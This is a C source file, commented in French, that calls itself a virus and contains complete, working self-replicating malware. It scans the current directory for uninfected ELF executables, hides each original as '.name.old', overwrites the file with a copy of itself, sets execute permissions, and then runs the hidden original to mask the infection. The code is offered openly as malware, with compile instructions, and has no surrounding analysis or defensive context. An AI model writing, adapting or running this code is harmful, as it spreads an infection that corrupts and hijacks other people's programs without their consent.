#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

//Pour compiler le virus
//gcc virus.c -o virus
//xxd -i virus > virus.h
//rm virus

static int is_valid_target(char *filename, char *selfname);
static char* get_filename(char *orig_name);
static void infect(char *self_name);

int main(int argc, char* argv[]) {
	char *filename = get_filename(argv[0]);
	infect(filename);
	printf("Ce programme est infecte\n");

	//Apelle le programe original, qui se nomme maintenant '.nomprogramme.old'
	char* new_filename = (char*)malloc(strlen(filename) + 5);
	strcpy(new_filename, "./.");
	strcat(new_filename, filename);
	strcat(new_filename, ".old");
	execv(new_filename, argv);
   
	return 0;
}

static void infect(char *self_name) {
	DIR* d = opendir(".");
	if (!d) { return; }
	struct dirent *dir;
	//Parcours le dossier courant a la recherche de programmes executable non-infecte
	while ((dir = readdir(d)) != NULL) {
		if(!is_valid_target(dir->d_name, self_name)) { continue; }
		//Creation du fichier '.nomprogramme.old;
		char new_name[50] = ".";
		strcat(new_name, dir->d_name);
		strcat(new_name, ".old");
		rename(dir->d_name, new_name);

		//Renome le programme, pour le remplacer en se copiant soi meme
      
		FILE *newfile = fopen(dir->d_name, "w");
		FILE *selffile = fopen(self_name, "r");
		char buffer[100];
		size_t bytes_read;
		while( (bytes_read = fread(buffer, 1, sizeof(buffer), selffile)) > 0 ) {
			fwrite(buffer, 1, bytes_read, newfile);
		}
		struct stat buf;
		stat(dir->d_name, &buf);
		chmod(dir->d_name, buf.st_mode | S_IXUSR | S_IXGRP | S_IXOTH);
		fclose(selffile);
		fclose(newfile);
	}
	closedir(d);
	return;
}
	
static int is_valid_target(char *filename, char *selfname) {
	//Test si il ne s'aggit pas de soi-meme
	if (strcmp(get_filename(selfname), filename) == 0) { return 0; };
	FILE *newfile = fopen(filename, "r");
	FILE *selffile = fopen(selfname, "r");
	//Test de si il s'agit bien d'un fichier executable, ne commencant pas par '.'
	char test[5];
	fgets(test, 5, newfile);
	if(test[0] != 127 || test[1] != 69 || test[2] != 76 || test[3] != 70) { return 0; }
	if(filename[0] == 46) { return 0; }
	
	//Test de si il ne s'agit pas d'un fichier deja infecte
	int ch1, ch2;
	//On passe le header
	rewind(newfile);
	for(int i = 0; i < 52; i++) { fgetc(selffile); fgetc(newfile); }
	//Parcours du fichier
	while( ((ch1 = fgetc(selffile)) != EOF) && ((ch2 = fgetc(newfile)) != EOF) ) {
		if(ch1 != ch2 ) {
			//Target valide
			fclose(newfile);
			fclose(selffile);
			return 1;
		}
	}
	//Il s'agit d'un fichier deja infecte
	fclose(newfile);
	fclose(selffile);
	return 0;
}

//Fonction pour prendre le nom du fichier dans un chemin (apres le dernier '/')
static char* get_filename(char *orig_name) {
	char *filename = orig_name;
	char* last_slash = strrchr(orig_name, '/');
	if(last_slash != NULL) {
		filename = last_slash + 1;
	}
	return filename;
}
